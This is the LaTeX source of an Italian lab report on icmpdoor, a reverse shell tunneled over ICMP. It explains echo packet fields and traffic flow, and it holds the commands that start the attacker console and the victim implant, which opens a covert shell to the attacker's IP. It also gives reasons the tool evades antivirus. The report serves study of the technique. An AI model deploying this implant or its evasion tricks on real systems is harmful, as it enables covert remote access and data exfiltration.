%https://medium.com/@nganbarle/icmpdoor-building-an-icmp-reverse-shell-in-python-3-c9b38a12013d  
%
%https://medium.com/@s12deff/icmp-reverse-shell-e3c8dd2466b7  
%https://cryptsus.com/blog/icmp-reverse-shell.html
%
%https://github.com/krabelize/icmpdoor
%
\subsection*{Svolgimento}
Con \textbf{icmpdoor} possiamo eseguire il tunneling di un canale nascosto per stabilire una reverse shell ICMP e controllare una macchina compromessa in modo da esfiltrare i dati. 
Molto probabilmente l'antivirus non lo rileverà ne lo bloccherà.
Funzionerà su "la maggior parte, se non tutte" le distribuzioni Linux e Windows 10 purché 
sia possibile eseguire il ping dalla macchina A alla macchina B.

\subsection{Reverse Shell} 
Una reverse shell è una sessione di shell remota che l'attaccante avvia dalla vittima verso se stesso, consentendogli di ottenere il 
controllo e di eseguire comandi sul sistema compromesso. 
Questa canale consentirà di estrarre dati. 
\vspace{1ex} \newline
I team di sicurezza spesso configurano i firewall per filtrare le porte TCP e UDP o bloccare applicazioni specifiche (firewalling di livello 7); 
tuttavia potrebbero trascurare il traffico ICMP siccome bloccare completamente il protocollo implicherebbe che gli host non possono più monitorarsi a vicenda. 
\vspace{2ex} \newline
\textbf{Icmpdoor} sfrutta esattamente questo l'exploit: siccome l'ICMP è spesso trascurato dai firewall, gli aggressori lo sfruttano per l'esfiltrazione furtiva dei dati o l'accesso remoto.
%Abusing ICMP as a backdoor has been done by at least one APT (Advanced Persistent Threat) group in the past. 
%ICMP firewall filtering is rarely configured which allows malicious actors to evade firewalls. 
\vspace{2ex} \newline
La Figura.\ref{fig:struttura:firewall} mostra come un firewall ben configurato blocca le tradizionali reverse shell tramite TCP e/o UDP.
\vspace{3ex} \newline
\captionof{figure}{Il firewall blocca una reverse shell sulla porta 4444} 
\includegraphics[width=\linewidth]{../img/icmpdoor/tcp-reverse-shell.png}
\label{fig:struttura:firewall} 
\vspace{4ex} \newline
Perché ha eluso Windows Defender
\begin{enumerate}
    \item Rilevamento Basato su Firma: 
    Molti motori AV si basano su firme di malware conosciute. L
    Questa versione di icmpdoor.exe semplicemente non era nel database.
    \item Punto Cieco ICMP: 
    Alcune soluzioni AV prestano maggiore attenzione al traffico TCP o UDP sospetto. 
    ICMP (ping) è ampiamente consentito per le normali operazioni di rete.
    \item Definizioni di difesa obsolete: 
    La mia macchina di destinazione potrebbe aver avuto un insieme di regole obsoleto. 
    Versioni più recenti potrebbero ritenerlo sospetti se vengono rilevati payload ICMP di grandi dimensioni.
\end{enumerate}
Tuttavia, anche con le regole aggiornate, una versione offuscata o ricompilata può spesso eludere i controlli di base.

\subsection{Struttura dei messaggi}
\begin{minipage}{0.5\textwidth}
    Nel protocollo ICMP, tipicamente, quando una Echo Request ICMP (tipo 8) viene mandata si aspetta in ritorno una Echo Reply (tipo 0) in cui payload è uguale a quello ricevuto.
%ICMP Type: 8 (request) from attacker, 0 (reply) from victim. COSA SCORRETTA NEL CASO DI PACCHETTI LUNGHI
\end{minipage}
\hspace{1ex}
\begin{minipage}{0.5\textwidth} 
    \centering
    \captionof{figure}{\textbf{RFC 792}: intestazione dei pacchetti Echo-Request e Echo-Reply}
    \includegraphics[width=\textwidth]{img/echo-request-and-echo-reply-message.jpg}
    \label{fig:icmp:packet} 
\end{minipage}
\vspace{2ex} \newline
\textbf{Campi ICMP}
\begin{itemize}
    \item L'indirizzo del mittente di un messaggio di Request sarà la destinazione del messaggio di Reply. 
    Quindi in un messaggio di risposta: gli indirizzi di sorgente e destinazione vengono semplicemente invertiti, 
    il codice di tipo viene cambiato in 0 e il checksum viene ricalcolato. 
    \item Il tipo 8 è per i Request Message mentre il tipo 0 per i Reply Message. 
    \item Codice$=0$ %Code 0 may be received from a gateway or a host.
    \item Il checksum è il complemento a uno in 16 bit della somma del complemento a uno del messaggio ICMP iniziando con il Tipo ICMP. 
    Per calcolarlo, il campo deve essere zero. Se la lunghezza totale è dispari, i dati ricevuti vengono riempiti 
    con un ottetto di zeri per calcolare il checksum. 
    \item Identificatore: se il codice è 0, aiuta nell'accoppiare i messaggi di richiesta e di risposta. Il valore può essere zero.
    \item Numero di sequenza: se il codice è 0, aiuta nell'accoppiare i messaggi di richiesta e di risposta. Il valore può essere zero.
    \item I dati ricevuti nel messaggio di richiesta, devono essere restituiti nel messaggio di risposta. 
    L'identificatore e il numero di sequenza possono essere utilizzati dal mittente per aiutare a abbinare le 
    Echo Reply con le Echo Request. Ad esempio, l'identificatore può essere utilizzato come una porta 
    in TCP o UDP per identificare una sessione, e il numero di sequenza può essere incrementato ad ogni richiesta 
    di eco inviata. 
\end{itemize} 
Il campo per i dati in ICMP è opzionale e viene normalmente utilizzato per la messaggistica di errore. 
Tuttavia, in questo caso verrà usato per il payload della reverse shell (campo Raw). 
Al suo interno quindi si nasconderanno i comandi dell'attaccante e le risposte della vittima. 
La sua dimensione massima può essere di 576 byte.
Quindi se la dimensione totale superasse questo limite, dovremo frammentare il payload.
Da notare inoltre che i dati non sono cifrati (e.g non usano la cifratura a base 64). 
Quindi se tramite Wireshark o TCPdump si aprisse il pacchetto, si vedrebbe il comando in chiaro così come l'output della vittima. 
Sebbene questo fatto sia semplice da notare se si guarda attentamente, molte reti non loggano o ispezionano in dettaglio i payload ICMP. 
\vspace{2ex} \newline
\begin{minipage}{\textwidth} 
    \centering
    \captionof{figure}{Esempio di un messaggio in chiaro}
    \includegraphics[width=0.7\textwidth]{img/icmpdoor/fileSegreto_wireshark_risA.jpg}
    \label{fig:icmp:packet:payload:chiaro} 
\end{minipage}
\vspace{2ex} \newline 
%Some advanced versions might obfuscate or chunk the payload, but the default is very straightforward.
Di base, Icmpdoor usa come identificatore il valore \textit{13170} (o in esadecimale \textit{0x3372}). 
Questi filtra messaggi non rilevanti (e.g ping di un altro dispositivo) e assicura che solo il prorpio traffico ICMP venga processato.

\subsubsection*{Campi dell'intestazione manipolati} 
\begin{itemize}
    \item pkt[IP].src (indirizzo IP della macchina A o B)
    \item ip[ttl] (Time To Live == 64)
    \item pkt[ICMP].type (Echo Request [8] oppure Echo Reply [0])
    \item pkt[ICMP].id Campo di identificazione (Id) statico con valore \textit{13170} (\textit{0x3372} in esadecimale)
    \item pkt[Raw].load (Payload $\neq$ empty)
\end{itemize}
\vspace{2ex} 
La Figura \ref{packets:example} mostra i liveli di incapsulamento dei pacchetti e i loro valori quando mandiamo il comando Linux.
I pacchetti di \textbf{Icmpdoor} sono quindi incapsulati (nei vari protocolli di rete) secondo questa struttura: 
\begin{itemize}
    \item \textbf{MAC}$\rightarrow$\textbf{IP}$\rightarrow$\textbf{ICMP}$\rightarrow$\textbf{Raw} 
\end{itemize}
\begin{minipage}{0.8\linewidth}
    \centering
    \captionof{figure}{Intestazione del pacchetto ICMP}
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/packet-headers.png}  
    \label{packets:example}
\end{minipage}
%id. with a reply uid=0(root) gid=0(root) groups=0(root). 
\vspace{2ex} \newline
Analizzando il traffico tramite Wireshark notiamo meglio il funzionamento di \textbf{Icmpdoor}:
\begin{enumerate}
    \item L'attaccante invia una richiesta ICMP in cui, nel campo Data, inserisce il comando da eseguire
    \item La vittima invia poi due risposte: una con il comando ricevuto e l'altra con la risposta che il comando ha restituito. 
\end{enumerate} 
Vediamo quindi che l'attaccante riesce a ricevere e leggere il contenuto del file. 

\subsection{Flusso del traffico}
Il modulo in Python 3 di Scapy ci aiuta a manipolare i campi di rete. 
Lsa Figura.\ref{fig:icmp:C2} mostra il flusso di connessione durante un Comando e Controllo (C2): 
\begin{minipage}{0.8\linewidth}
    \centering
    \captionof{figure}{Icmpdoor Command \& Control (C2) su ICMP}
    \includegraphics[width=\linewidth]{../img/icmpdoor/icmp-reverse-shell.png}
    \label{fig:icmp:C2}
\end{minipage}
\vspace{2ex}
\begin{enumerate}
    \item Attacker sends an ICMP echo-request (type 8) with ID=13170, embedding commands in the payload (e.g. hostname).
    \item Victim (Implant) receives that request, notices the matching ID, extracts and executes the command locally with os.popen.
    \item The victim sends the output of the command back to the attacker’s machine over ICMP echo-reply (code 0) with the same ICMP ID 13170.
    %Victim replies to the attacker with an ICMP echo-reply (type 0) containing the command’s output.
    \item The attacker’s console displays it as if it were a normal shell session.
\end{enumerate}
Icmpdoor non scade autonomamente siccome non stabilisce una socket. 
Invece, questa shell interattiva è priva di connessione a causa del protocollo ICMP. 
Questa tecnica funziona con IP globali instradabili (connessioni WAN). 
%This technique works with global routable IP’s (WAN connections).
\vspace{4ex} \newline
Proviamo a testare lo strumento collegando l'attaccante alla vittima. 
Prima lo scarichiamo su entrambe le machcine tramite la repository GitHub. 
%Pre-compiled stand-alone binaries for Windows 10 and Linux are also available from the same repo.
\begin{minipage}{\linewidth}
    %Per collegare invece le due macchine eseguiamo su quella dell'attaccante il comando: 
    \begin{lstlisting} 
        ./icmp-cnc.py -i INTERFACE -d VICTIM-IP 

        sudo python3 ./icmp-cnc.py -i enp0s3 -d 192.168.1.42
    \end{lstlisting} 
    \captionof{lstlisting}{Comando C2 (Command \& Control) per l'attaccante}
    %\captionof{lstlisting}{Setting up the attacker}
    \label{lstlisting:icmpdoor:setup:attacker} 
    Where enp0s3 is the interface where the packets are going through and 192.168.1.42 is the IP address of the victim
\end{minipage}
\begin{minipage}{\linewidth}
    \centering
    \includegraphics[width=0.5\linewidth]{../img/icmpdoor/attaccante_C2.png}
    \captionof{figure}{Setting up the attacker} 
    \label{fig:icmpdoor:setup:attacker}
\end{minipage}
\vspace{2ex} 
\begin{minipage}{\linewidth}
    %Mettiamo la vititma in ascolto delle richieste da parte dell'attaccante con il comando: 
    \begin{lstlisting} 
        ./icmpdoor.py -i INTERFACE -d CNC-IP 

        sudo python3 ./icmpdoor.py -i enp0s3 -d 192.168.1.35
    \end{lstlisting} 
    \captionof{lstlisting}{Comando (Implant) per la vittima}
    %\captionof{lstlisting}{Setting up the victim}
    \label{lstlisting:icmpdoor:setup:victim}
    Where 192.168.1.35 is the IP address of the attacker.
\end{minipage}
\begin{minipage}{\linewidth}
    \centering
    \includegraphics[width=0.5\linewidth]{../img/icmpdoor/vittima-implant.png}
    \captionof{figure}{Setting up the victim}
    \label{fig:icmpdoor:setup:victim}
\end{minipage}
\vspace{1ex}
Dopo aver clonata la repository, prepariamo la nostra macchina attaccante. 
E una volta che il server è attivo, si esegue la connessione con la vittima ottenendo così la shell. 
Siamo riusciti quindi a collegare l'attaccante alla vittima; 
verifichiamo la cosa stampando il nome della macchina su cui viene eseguita la shell e l'indirrizzo IP. 
Come possiamo vedere (Fig.\ref{fig:icmpdoor:collegamento:esempio}) l'hostname è \textit{vittima} e l'indirizzo IP è \textit{192.168.1.42}
\begin{minipage}{\linewidth}
    \centering
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_2.png}
    \captionof{figure}{Esempio Collegamento}
    \label{fig:icmpdoor:collegamento:esempio}
\end{minipage}
\vspace{2ex} \newline
Verifichiamo ora che con la reverse shell si possa navigare il file system della vittima. 
Procediamo quindi a verificarne la possibilita cercando presenza dei due file \textit{vittima.txt} e stampandone poi il contenuto. 
%Infatti per distinguere le due macchine abbiamo creato un file di testo su entrambe.
\newline
\begin{minipage}{0.5\linewidth}
    \centering
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_3.png} 
    \vspace{2ex} \break
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_5.png} 
\end{minipage}
\begin{minipage}{0.5\linewidth}
    \centering 
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_4.png} 
    \captionof{figure}{Esempi sul file system}
    \label{fig:icmpdoor:collegamento:fylesystem}
\end{minipage}
\vspace{2ex} \newline
Una cosa notata durante l'analisi del traffico è il numero di Echo Reply spedite (Fig.\ref{fig:wireshark:ls}).
La reverse shell manda per ogni elemento un pacchetto ICMP verso l'attaccante; 
che nel totale risulteranno in \textbf{13 Echo Reply}. 
In questo caso potrebbero semprare poce ma se la cartella contenesse più elementi, il numero di risposte potrebbe aumentare.
Quindi un numero elevato di risposte verso la stessa destinazione potrebbe destare sospetti e attirare l'attenzione vero il canale di comunicazione da parte di un IDS o di un Anitvirus.
\vspace{1ex} \newline
\begin{minipage}{\linewidth}
    \centering 
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/wireshark_ipaddr_numReply.jpg} 
    \captionof{figure}{Traffico ICMP relatico al comando \textit{ls -s}}
    \label{fig:wireshark:ls}
\end{minipage}
\vspace{2ex} \newline
Tuttavia provando a creare un file tramite la reverse shell, notiamo che non tutti i comandi vengono eseguiti correttamente. 
La vittima esegue comunque il comando tuttavia la connessione con l'attaccante crasha.
Il problema viene risolto se il comando permette alla vittima di rispondere con un Echo Reply (Fig.\ref{fig:test:creazioneFile}).
\begin{lstlisting}
    echo "Sono le 12:47 deel 23/04/2025" > prova.txt; 
    echo "Done"
\end{lstlisting} 
\captionof{lstlisting}{Creazione del file}
\label{lstlisting:test:creazioneFile}
%
\includegraphics[width=\linewidth]{../img/icmpdoor/prova_file.png}
\label{fig:test:creazioneFile}
\vspace{2ex} \newline
Proviamo ora a vedere cosa succede se il contentuto di un file è molto lungo. 
Tramite uno script python lo creiamo, e al suo interno ripetiamo la parola "hugeFile" (Code.\ref{lstlisting:script:hugefile}). 
Poi proviamo a ricavare il contenuto tramite la reverse shell (Fig.\ref{fig:script:hugefile}). 
\begin{lstlisting}
    with open("hugefile.txt", "w") as f:
        f.write("hugeFile - "*999)
    f.close()
\end{lstlisting} 
\captionof{lstlisting}{Script per la creazione del file}
\label{lstlisting:script:hugefile}
\vspace{2ex}
Vediamo che l'attaccante chrasha quando prova a stampare il contenuto del file; 
tuttavia dall'analisi del traffico risulta che il pacchetto ICMP contiene tutti i dati del file (Fig.\ref{fig:wireshark:hugefile}).
Infatti analizzando il traffico vediamo che tutti i 10989 byte sono contenuti nel campo Data del pacchetto. 
\vspace{2ex} \newline
\begin{minipage}{\linewidth}
    \centering
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/hugefile_attaccante.png}
    \captionof{figure}{Contenuto e statistiche del file \textit{hugefile.txt}}
    \label{fig:script:hugefile}
\end{minipage}
\vspace{2ex} \newline
\begin{minipage}{\linewidth}
    \centering
    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/hugefile_wireshark_data.jpg}
    \captionof{figure}{Traffico ICMP relativo al file \textit{hugefile.txt}}
    \label{fig:wireshark:hugefile}
\end{minipage}
%\begin{minipage}{0.5\textwidth}
%    \includegraphics[width=\textwidth]{../img/icmpdoor/fileSegreto_wireshark_risA.png}
%    \includegraphics[width=\textwidth]{../img/icmpdoor/fileSegreto_wireshark_risV.png}
%\end{minipage}

